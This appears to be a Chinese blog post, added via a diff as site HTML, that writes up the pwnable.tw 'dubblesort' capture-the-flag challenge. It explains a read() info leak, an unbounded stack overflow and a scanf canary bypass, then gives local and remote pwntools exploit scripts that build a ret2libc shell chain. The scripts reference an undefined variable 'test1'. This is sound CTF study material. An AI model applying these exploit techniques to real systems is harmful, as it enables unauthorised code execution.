@@ -1,0 +1,386 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><meta name="description" content="时隔一年，又重新开始刷题啦~ 加油加油(ง •_•)ง">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwnable.tw之dubblesort">
+<meta property="og:url" content="http://blingblingxuanxuan.github.io/2021/05/15/pwnable-tw-dubblesort/index.html">
+<meta property="og:site_name" content="Clang鱼塘">
+<meta property="og:description" content="时隔一年，又重新开始刷题啦~ 加油加油(ง •_•)ง">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://blingblingxuanxuan.github.io/2021/05/15/pwnable-tw-dubblesort/pwnable-tw-dubblesort.assets/image-20210515183536310.png">
+<meta property="og:image" content="http://blingblingxuanxuan.github.io/2021/05/15/pwnable-tw-dubblesort/pwnable-tw-dubblesort.assets/image-20210515121957899.png">
+<meta property="og:image" content="http://blingblingxuanxuan.github.io/2021/05/15/pwnable-tw-dubblesort/pwnable-tw-dubblesort.assets/image-20210515190651246.png">
+<meta property="article:published_time" content="2021-05-15T10:03:05.000Z">
+<meta property="article:modified_time" content="2021-05-15T11:13:32.057Z">
+<meta property="article:author" content="blingbling">
+<meta property="article:tag" content="read func">
+<meta property="article:tag" content="scanf func">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://blingblingxuanxuan.github.io/2021/05/15/pwnable-tw-dubblesort/pwnable-tw-dubblesort.assets/image-20210515183536310.png"><title>pwnable.tw之dubblesort | Clang鱼塘</title><link ref="canonical" href="http://blingblingxuanxuan.github.io/2021/05/15/pwnable-tw-dubblesort/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  assistSearch: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
+  header: {"enable":true,"showOnPost":true,"scrollDownIcon":true},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"default","highlight":"light","wordWrap":false},
+  reward: false,
+  fancybox: false,
+  zoomImage: {"gapAside":"20px"},
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: undefined,
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"复制","copySuccess":"复制成功","copyError":"复制失败"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.3.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="javascript:;" onclick="return false;"><span class="header-nav-menu-item__icon"><i class="fas fa-feather-alt"></i></span><span class="header-nav-menu-item__text">文章</span></a><div class="header-nav-submenu"><div class="header-nav-submenu-item"><a class="header-nav-submenu-item__link" href="/archives/"><span class="header-nav-submenu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-submenu-item__text">归档</span></a></div><div class="header-nav-submenu-item"><a class="header-nav-submenu-item__link" href="/categories/"><span class="header-nav-submenu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-submenu-item__text">分类</span></a></div><div class="header-nav-submenu-item"><a class="header-nav-submenu-item__link" href="/tags/"><span class="header-nav-submenu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-submenu-item__text">标签</span></a></div></div></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="javascript:;" onclick="return false;"><span class="header-nav-menu-item__icon"><i class="fas fa-fingerprint"></i></span><span class="header-nav-menu-item__text">关于</span></a><div class="header-nav-submenu"><div class="header-nav-submenu-item"><a class="header-nav-submenu-item__link" href="/author/"><span class="header-nav-submenu-item__icon"><i class="fas fa-user"></i></span><span class="header-nav-submenu-item__text">作者</span></a></div></div></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="javascript:;" onclick="return false;"><span class="header-nav-menu-item__icon"><i class="fas fa-angle-double-down"></i></span><span class="header-nav-menu-item__text">其他</span></a><div class="header-nav-submenu"><div class="header-nav-submenu-item"><a class="header-nav-submenu-item__link" href="/friends/"><span class="header-nav-submenu-item__icon"><i class="fas fa-thumbs-up"></i></span><span class="header-nav-submenu-item__text">友链</span></a></div></div></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">搜索</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">Clang鱼塘</div><div class="header-banner-info__subtitle"></div></div><div class="header-banner-arrow"><div class="header-banner-arrow__icon"><i class="fas fa-angle-down"></i></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">pwnable.tw之dubblesort</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2021-05-15</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2021-05-15</span></span><span class="post-meta-item post-meta-item--visitors"><span class="post-meta-item__icon"><i class="fas fa-eye"></i></span><span class="post-meta-item__info">阅读次数</span><span class="post-meta-item__value" id="busuanzi_value_page_pv"></span></span></div></header><div class="post-body"><p>题目文件如下：</p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://pwnable.tw/static/chall/dubblesort" >dubblesort</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://pwnable.tw/static/libc/libc_32.so.6" >libc.so</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+
+        <h1 id="分析过程"   >
+          <a href="#分析过程" class="heading-link"><i class="fas fa-link"></i></a><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1>
+      <p>首先查看二进制基本信息：</p>
+<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> file dubblesort</span> </span><br><span class="line">dubblesort: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=12a217baf7cbdf2bb5c344ff14adcf7703672fb1, stripped</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> checksec dubblesort</span></span><br><span class="line">[*] &#x27;/home/bling/pwnable_tw/dubblesort/dubblesort&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></div></figure>
+<p>IDA分析伪代码流程，如下代码中将几个漏洞点标记出来了。</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  _BYTE *v4; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> j; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v8; <span class="comment">// [esp+18h] [ebp-74h] BYREF</span></span><br><span class="line">  _BYTE v9[<span class="number">32</span>]; <span class="comment">// [esp+1Ch] [ebp-70h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">64</span>]; <span class="comment">// [esp+3Ch] [ebp-50h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v11; <span class="comment">// [esp+7Ch] [ebp-10h]</span></span><br><span class="line"></span><br><span class="line">  v11 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  sub_8B5();</span><br><span class="line">  __printf_chk(<span class="number">1</span>, <span class="string">&quot;What your name :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x40</span>u);</span><br><span class="line">  __printf_chk(<span class="number">1</span>, <span class="string">&quot;Hello %s,How many numbers do you what to sort :&quot;</span>);		<span class="comment">//read函数不会在输入结尾置&quot;\x00&quot;，导致使用&quot;%s&quot;格式化输出时越界打印，造成信息泄露</span></span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, &amp;v8);</span><br><span class="line">  v3 = v8;</span><br><span class="line">  <span class="keyword">if</span> ( v8 )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = v9;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v8; ++i )		<span class="comment">//未限制v8的大小，导致循环中对地址v4的写入过程产生栈溢出</span></span><br><span class="line">    &#123;</span><br><span class="line">      __printf_chk(<span class="number">1</span>, <span class="string">&quot;Enter the %d number : &quot;</span>);</span><br><span class="line">      fflush(<span class="built_in">stdout</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, v4);			<span class="comment">// scanf函数在格式化字符类型与实际类型不匹配时，不会往栈上写入内容，直接进入下一步</span></span><br><span class="line">      v3 = v8;</span><br><span class="line">      v4 += <span class="number">4</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_931(v9, v3);			<span class="comment">//这里就是一个排序函数，利用的时候要考虑输入数据大小的不同，会导致最后在栈上存储顺序不同</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Result :&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v8 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; v8; ++j )</span><br><span class="line">      __printf_chk(<span class="number">1</span>, <span class="string">&quot;%u &quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( __readgsdword(<span class="number">0x14</span>u) != v11 )</span><br><span class="line">    sub_BA0();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+
+
+
+        <h2 id="通过read函数泄露信息"   >
+          <a href="#通过read函数泄露信息" class="heading-link"><i class="fas fa-link"></i></a><a href="#通过read函数泄露信息" class="headerlink" title="通过read函数泄露信息"></a>通过read函数泄露信息</h2>
+      <blockquote>
+<p>read函数接收输入后（把’\n’也当作一个字符），并不会在末尾添加”\x00”。那么如果后续以”%s”对该输入进行输出操作，就会越界打印，造成信息泄露。</p>
+</blockquote>
+<p>随便输入几个字母，可以看到打印出了乱码。多打印出来的字符来自于栈上，栈上可能存有libc的地址，因此考虑用这个漏洞泄露libc基址。</p>
+<p><img src="pwnable-tw-dubblesort.assets/image-20210515183536310.png" alt="image-20210515183536310"></p>
+<p>下图展示了本地栈空间内容，输入的是‘aaaa’（对应0xffffce4c处的0x61616161），可以看到0x61616161后的栈空间内有很多f7开头的、长得很像地址的值。对应到vmmap获取的进程空间，目标集中在了“0xf7fb2000”这个值。输入的第六和第七个单元都是它，经过实践，本地泄露第六个单元能成功，远程泄露第七个单元才能成功。</p>
+<p>另外还有一个需要注意的点，本地调试中0xf7fb2000对应libc的got.plt段，其加载偏移通过<code>readelf -S /lib/i386-linux-gnu/libc-2.27.so</code>得到是0x1d8000，因此本地利用时libc基址为<code>0xf7fb2000 - 0x1d8000</code>。</p>
+<p>而远端libc跟本地不一样，其got.plt段加载偏移通过<code>readelf -S libc_32.so.6</code>得到是0x1b0000。因此在打远程的时候，需要用<code>泄露地址 - 0x1b0000</code>来得到lbic基址。</p>
+<p><img src="pwnable-tw-dubblesort.assets/image-20210515121957899.png" alt="image-20210515121957899"></p>
+
+        <h2 id="未限制numbers大小导致栈溢出"   >
+          <a href="#未限制numbers大小导致栈溢出" class="heading-link"><i class="fas fa-link"></i></a><a href="#未限制numbers大小导致栈溢出" class="headerlink" title="未限制numbers大小导致栈溢出"></a>未限制numbers大小导致栈溢出</h2>
+      <p>源码中V8是用户输入的数据，未做限制便作为for循环的条件，导致可以往栈上写任意长度的数据。</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v8 )</span><br><span class="line">&#123;</span><br><span class="line">  v4 = v9;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v8; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    __printf_chk(<span class="number">1</span>, <span class="string">&quot;Enter the %d number : &quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, v4);</span><br><span class="line">    v3 = v8;</span><br><span class="line">    v4 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+
+        <h2 id="通过scanf函数绕过canary"   >
+          <a href="#通过scanf函数绕过canary" class="heading-link"><i class="fas fa-link"></i></a><a href="#通过scanf函数绕过canary" class="headerlink" title="通过scanf函数绕过canary"></a>通过scanf函数绕过canary</h2>
+      <blockquote>
+<p>scanf函数在格式字符类型和输入字符类型不匹配时，不会将内容写入栈上，也不会报错，而是继续执行。</p>
+</blockquote>
+<p>本题中利用scanf的这个特性，可以绕过canary的限制。</p>
+<p>scanf(“%u”,v4)：</p>
+<ul>
+<li>当输入的v4为字母时，会被定义为非法字符，虽然不会往栈上写数据，但这个字母会一直存在于输入缓冲区，导致一直无法输入。</li>
+<li>而当输入为’+’ ‘-‘这两个字符时，由于他们可以定义数字的正负，因此不会被定义为非法字符。同时单独输入该字符又能达到不往栈上写入数据的目的。</li>
+</ul>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">if ( v8 )</span><br><span class="line">&#123;</span><br><span class="line">  v4 &#x3D; v9;</span><br><span class="line">  for ( i &#x3D; 0; i &lt; v8; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    __printf_chk(1, &quot;Enter the %d number : &quot;);</span><br><span class="line">    fflush(stdout);</span><br><span class="line">    __isoc99_scanf(&quot;%u&quot;, v4);</span><br><span class="line">    v3 &#x3D; v8;</span><br><span class="line">    v4 +&#x3D; 4;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+<p><img src="pwnable-tw-dubblesort.assets/image-20210515190651246.png" alt="image-20210515190651246"></p>
+
+        <h1 id="EXP"   >
+          <a href="#EXP" class="heading-link"><i class="fas fa-link"></i></a><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1>
+      
+        <h2 id="本地"   >
+          <a href="#本地" class="heading-link"><i class="fas fa-link"></i></a><a href="#本地" class="headerlink" title="本地"></a>本地</h2>
+      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;i386&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">myelf = ELF(<span class="string">&quot;./dubblesort&quot;</span>)</span><br><span class="line">pr = process(myelf.path)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc base</span></span><br><span class="line">pr.recvuntil(<span class="string">&quot;What your name :&quot;</span>)</span><br><span class="line">pr.sendline(<span class="string">&quot;aaaabbbbccccddddeeee&quot;</span>)</span><br><span class="line">pr.recvuntil(<span class="string">&quot;eeee\n&quot;</span>)</span><br><span class="line">libc = pr.recvuntil(<span class="string">&quot;,&quot;</span>)[:<span class="number">3</span>].ljust(<span class="number">4</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">libc = u32(test1)&lt;&lt;<span class="number">8</span></span><br><span class="line">log.warn(<span class="string">&quot;leak libc : 0x%x&quot;</span> % test1)</span><br><span class="line"></span><br><span class="line">libc_base_remote = libc - <span class="number">0x1b0000</span></span><br><span class="line">log.warn(<span class="string">&quot;libc base: 0x%x&quot;</span> % libc_base_remote)</span><br><span class="line">sys_remote = libc_base_remote + <span class="number">0x3A940</span></span><br><span class="line">binsh_remote = libc_base_remote + <span class="number">0x158E8B</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gadget_addr = libc_base_local + 0x67bdf    # fail</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># stack overflow</span></span><br><span class="line">pr.recvuntil(<span class="string">&quot;do you what to sort :&quot;</span>)</span><br><span class="line">pr.sendline(<span class="built_in">str</span>(<span class="number">35</span>))</span><br><span class="line"><span class="comment"># gdb.attach(pr,&#x27;b fflush \n c&#x27;)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>):</span><br><span class="line">    pr.recvuntil(<span class="string">&quot;number : &quot;</span>)</span><br><span class="line">    pr.sendline(<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line">pr.recvuntil(<span class="string">&quot;number : &quot;</span>)</span><br><span class="line">pr.sendline(<span class="string">&#x27;+&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    pr.recvuntil(<span class="string">&quot;number : &quot;</span>)</span><br><span class="line">    pr.sendline(<span class="built_in">str</span>(<span class="number">0xeeeeeee0</span>+j))</span><br><span class="line"></span><br><span class="line">pr.recvuntil(<span class="string">&quot;number : &quot;</span>)</span><br><span class="line">pr.sendline(<span class="built_in">str</span>(sys_remote))</span><br><span class="line">pr.recvuntil(<span class="string">&quot;number : &quot;</span>)</span><br><span class="line">pr.sendline(<span class="built_in">str</span>(sys_remote+<span class="number">0x10</span>))</span><br><span class="line">pr.recvuntil(<span class="string">&quot;number : &quot;</span>)</span><br><span class="line">pr.sendline(<span class="built_in">str</span>(binsh_remote))</span><br><span class="line"></span><br><span class="line">pr.interactive()</span><br></pre></td></tr></table></div></figure>
+
+
+
+        <h2 id="远程"   >
+          <a href="#远程" class="heading-link"><i class="fas fa-link"></i></a><a href="#远程" class="headerlink" title="远程"></a>远程</h2>
+      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;i386&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">pr = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>,<span class="number">10101</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc base</span></span><br><span class="line">pr.recvuntil(<span class="string">&quot;What your name :&quot;</span>)</span><br><span class="line">pr.sendline(<span class="string">&quot;aaaabbbbccccddddeeeeffff&quot;</span>)</span><br><span class="line">pr.recvuntil(<span class="string">&quot;ffff\n&quot;</span>)</span><br><span class="line">libc = pr.recvuntil(<span class="string">&quot;,&quot;</span>)[:<span class="number">3</span>].ljust(<span class="number">4</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">libc = u32(test1)&lt;&lt;<span class="number">8</span></span><br><span class="line">log.warn(<span class="string">&quot;leak libc : 0x%x&quot;</span> % test1)</span><br><span class="line"></span><br><span class="line">libc_base_remote = libc - <span class="number">0x1b0000</span></span><br><span class="line">log.warn(<span class="string">&quot;libc base: 0x%x&quot;</span> % libc_base_remote)</span><br><span class="line">sys_remote = libc_base_remote + <span class="number">0x3A940</span></span><br><span class="line">binsh_remote = libc_base_remote + <span class="number">0x158E8B</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># stack overflow</span></span><br><span class="line">pr.recvuntil(<span class="string">&quot;do you what to sort :&quot;</span>)</span><br><span class="line">pr.sendline(<span class="built_in">str</span>(<span class="number">35</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造0-&gt;23,canary,0xeeeeeee0,~1,~2,~3,~4,~5,~6,sys_addr,sys_addr+0x10,binsh_addr</span></span><br><span class="line"><span class="comment"># 排序后，依然是以上顺序，</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>):</span><br><span class="line">    pr.recvuntil(<span class="string">&quot;number : &quot;</span>)</span><br><span class="line">    pr.sendline(<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line">pr.recvuntil(<span class="string">&quot;number : &quot;</span>)</span><br><span class="line">pr.sendline(<span class="string">&#x27;+&#x27;</span>)		<span class="comment"># 在canary处不写入</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    pr.recvuntil(<span class="string">&quot;number : &quot;</span>)</span><br><span class="line">    pr.sendline(<span class="built_in">str</span>(<span class="number">0xeeeeeee0</span>+j))</span><br><span class="line"></span><br><span class="line">pr.recvuntil(<span class="string">&quot;number : &quot;</span>)</span><br><span class="line">pr.sendline(<span class="built_in">str</span>(sys_remote))</span><br><span class="line">pr.recvuntil(<span class="string">&quot;number : &quot;</span>)</span><br><span class="line">pr.sendline(<span class="built_in">str</span>(sys_remote+<span class="number">0x10</span>))</span><br><span class="line">pr.recvuntil(<span class="string">&quot;number : &quot;</span>)</span><br><span class="line">pr.sendline(<span class="built_in">str</span>(binsh_remote))</span><br><span class="line"></span><br><span class="line">pr.interactive()</span><br></pre></td></tr></table></div></figure>
+
+
+
+
+
+        <h1 id="参考"   >
+          <a href="#参考" class="heading-link"><i class="fas fa-link"></i></a><a href="#参考" class="headerlink" title="参考"></a>参考</h1>
+      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.freebuf.com/articles/others-articles/134271.html" >pwnable.tw刷题之dubblesort</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ 本文结束，感谢您的阅读 ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">本文作者: </span><span class="copyright-author__value"><a href="http://blingblingxuanxuan.github.io">blingbling</a></span></div><div class="copyright-link"><span class="copyright-link__name">本文链接: </span><span class="copyright-link__value"><a href="http://blingblingxuanxuan.github.io/2021/05/15/pwnable-tw-dubblesort/">http://blingblingxuanxuan.github.io/2021/05/15/pwnable-tw-dubblesort/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">版权声明: </span><span class="copyright-notice__value">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> 许可协议。转载请注明出处！</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://blingblingxuanxuan.github.io/tags/read-func/">read func</a></span><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://blingblingxuanxuan.github.io/tags/scanf-func/">scanf func</a></span></div><nav class="post-paginator paginator"><div class="paginator-next"><a class="paginator-next__link" href="/2021/03/28/CVE-2012-0809/"><span class="paginator-prev__text">CVE-2012-0809漏洞复现</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">文章目录</span><span class="sidebar-nav-ov">站点概览</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B"><span class="toc-number">1.</span> <span class="toc-text">
